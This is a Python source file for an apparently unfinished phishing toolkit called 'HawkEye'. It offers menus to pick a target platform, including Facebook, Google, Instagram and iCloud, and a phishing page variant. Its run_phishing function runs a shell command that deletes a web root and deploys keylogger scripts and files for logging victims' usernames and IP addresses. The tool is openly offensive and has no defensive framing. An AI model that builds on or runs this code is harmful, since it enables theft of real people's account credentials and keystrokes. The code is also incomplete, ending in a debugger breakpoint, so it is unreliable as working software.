import multiprocessing
import pathlib
from os import system

MAGENTA, BLUE, RED, WHITE, CYAN, GREEN, DEFAULT  = '\033[35m', '\u001b[34;1m' , '\033[1;91m', '\033[46m', '\033[36m', '\033[1;32m',  '\033[0m'

class HawkEye(object):

    def __init__(self):
        
        self.attack_vectors = (
            'Facebook',
            'Snapchat',
            'Google',
            'iCloud',
            'Microsoft',
            'Instagram',
            'Yahoo'
        )

    def generate_menu(self):
        print(f'''
<========================================================================>
||                                                                      ||
||     ██╗  ██╗ █████╗ ██╗    ██╗██╗  ██╗{BLUE}███████╗██╗   ██╗███████╗{DEFAULT}      ||
||     ██║  ██║██╔══██╗██║    ██║██║ ██╔╝{BLUE}██╔════╝╚██╗ ██╔╝██╔════╝{DEFAULT}      ||
||     ███████║███████║██║ █╗ ██║█████╔╝ {BLUE}█████╗   ╚████╔╝ █████╗  {DEFAULT}      ||
||     ██╔══██║██╔══██║██║███╗██║██╔═██╗ {BLUE}██╔══╝    ╚██╔╝  ██╔══╝  {DEFAULT}      ||
||     ██║  ██║██║  ██║╚███╔███╔╝██║  ██╗{BLUE}███████╗   ██║   ███████╗{DEFAULT}      ||
||     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝{BLUE}╚══════╝   ╚═╝   ╚══════╝{DEFAULT}      ||
||                                                                      || 
||                           \"You Are Free\"                             ||
||                                                                      ||
<========================================================================>                                                   
        ''')
        
        print('Choose The Attack Platform:\n')

        for ind, vector in enumerate(self.attack_vectors):
            print(f"   [{BLUE}{ind}{DEFAULT}] [{vector}]")
        
        while True:
            try:
                attack_resp = int(input("\nSelect Something >>> "))
                if(isinstance(attack_resp, int)) and attack_resp < len(self.attack_vectors): break
                print("Must be a listed option")

            except ValueError as e:
                print('Value must be an integer!')

        custom_option = self.load_attack(self.attack_vectors[attack_resp])
        self.custom_input()
        self.run_phishing(self.attack_vectors[attack_resp], custom_option)

    def custom_input(self):
        custom = input("Custom Redirect Link (Blank to Loop) >>> ")
        if any(prefix in custom for prefix in ['http://', 'https://']): pass
        else: custom = 'http://'+custom
        
        print(custom)

    def load_attack(self, attack_vector):

        extra_options = {
            self.attack_vectors[0]: [
                'Standard Phishing Page',
                'Advanced Phishing Page',
                'Fake Security Issue',
                'Facebook Messenger Page'
            ],

            self.attack_vectors[2]: [
                'Standard Phishing Page',
                'Advanced Phishing Page',
                'New Google Web'
            ],

            self.attack_vectors[5]: [
                'Standard Phishing Page',
                'Instagram Autolinker Phishing',
                'Instagram Advanced Scenario'
            ]
        }

        print(f'{RED}Loading Module {attack_vector}...{DEFAULT}')
        
        if attack_vector in [k for k in extra_options]:
            for ind, option in enumerate(extra_options[attack_vector]):
                print(f" [{ind}] [{option}]")
            while True:
                try: 
                    selected = int(input("\nSay Something >>> "))
                    if(isinstance(selected, int) and selected < len(extra_options[attack_vector])): break
                    print('Must be a listed option')
                except ValueError: print("Must be integer")
            return selected
        return 0

    def run_phishing(self, page, option):
        print(page, option)
        system('rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/')
        p = pathlib.Path('WebPages')
        import pdb; pdb.set_trace()        



if __name__ == '__main__':
    app = HawkEye()
    app.generate_menu()